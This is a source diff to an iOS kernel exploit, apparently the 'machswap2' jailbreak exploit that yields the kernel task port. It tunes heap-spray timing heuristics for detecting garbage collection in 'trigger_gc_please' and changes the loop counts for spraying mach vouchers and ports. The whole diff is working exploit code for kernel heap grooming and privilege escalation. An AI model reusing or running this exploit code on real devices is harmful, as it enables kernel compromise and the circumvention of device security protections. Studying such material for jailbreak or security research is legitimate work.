@@ -243,6 +243,9 @@ static void trigger_gc_please()
     memset(body, 0x41, body_size);
     
     int64_t avgTime = 0;
+    uint64_t maxTime = 0;
+    uint64_t avgDeviation = 0;
+    uint64_t maxDeviation = 0;
     for (int i = 0; i < gc_ports_cnt; i++)
     {
         uint64_t t0;
@@ -251,21 +254,39 @@ static void trigger_gc_please()
         t0 = mach_absolute_time();
         gc_ports[i] = send_kalloc_message(body, body_size);
         tdelta = mach_absolute_time() - t0;
+        uint64_t deviation = llabs(tdelta - avgTime);
+        if (i == 0) {
+            avgTime = maxTime = tdelta;
+            continue;
+        }
 
         /* 
-            this won't necessarily get triggered on newer/faster devices (ie. >=A9)
-            this is mainly designed for older devices (in my case, A7) where spraying
-            such a large amount of data is a painful process 
-            the idea here is to look for a longer spray which signals that GC may have
+            The idea here is to look for an abnormally longer spray which signals that GC may have
             taken place
         */
-        if (avgTime && tdelta - avgTime > avgTime)
+        // TODO: Remove this log before merging to develop
+        LOG("%d: T:%lld avg T:%lld D:%lld max D:%lld avg D:%lld", i, tdelta, avgTime, deviation, maxDeviation, avgDeviation);
+        
+        if (tdelta - avgTime > avgTime*2 ||
+            (deviation > MAX(avgDeviation * 2, 0x10000)) )
         {
             LOG("got gc at %d -- breaking", i);
             gc_ports_max = i;
             break;
         }
-        avgTime = ( avgTime * i + tdelta ) / (i + 1);
+        if (deviation > maxDeviation) {
+            avgDeviation = maxDeviation?(avgDeviation * i + maxDeviation) / (i+1):deviation;
+            maxDeviation = deviation;
+        } else {
+            avgDeviation = (avgDeviation * i + deviation) / (i+1);
+        }
+        
+        if (tdelta > maxTime) {
+            avgTime = (avgTime * i + maxTime) / (i+1);
+            maxTime = tdelta;
+        } else {
+            avgTime = (avgTime * i + tdelta) / (i+1);
+        }
     }
 
     for (int i = 0; i < gc_ports_max; i++)
@@ -857,7 +878,7 @@ kern_return_t machswap2_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, 
     ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p3);
 
     /* allocate 0x2000 vouchers to alloc some new fresh pages */
-    for (int i = 0; i < sizeof(before) / sizeof(mach_port_t); i++)
+    for (int i = 0; i < 0x2000; i++)
     {
         ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &before[i]);
     }
@@ -867,7 +888,7 @@ kern_return_t machswap2_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, 
     ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p1);
     
     /* allocate 0x1000 more vouchers */
-    for (int i = 0; i < sizeof(after) / sizeof(mach_port_t); i++)
+    for (int i = 0; i < 0x1000; i++)
     {
         ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &after[i]);
     }
@@ -1595,12 +1616,12 @@ value = value | ((uint64_t)read64_tmp << 32);\
     ret = KERN_SUCCESS;
 
 out:;
-    for (int i = 0; i < sizeof(preport) / sizeof(mach_port_t); i++)
+    for (int i = 0; i < 0x1000; i++)
     {
         mach_port_destroy(mach_task_self(), preport[i]);
     }
 
-    for (int i = 0; i < sizeof(postport) / sizeof(mach_port_t); i++)
+    for (int i = 0; i < 0x200; i++)
     {
         mach_port_destroy(mach_task_self(), postport[i]);
     }
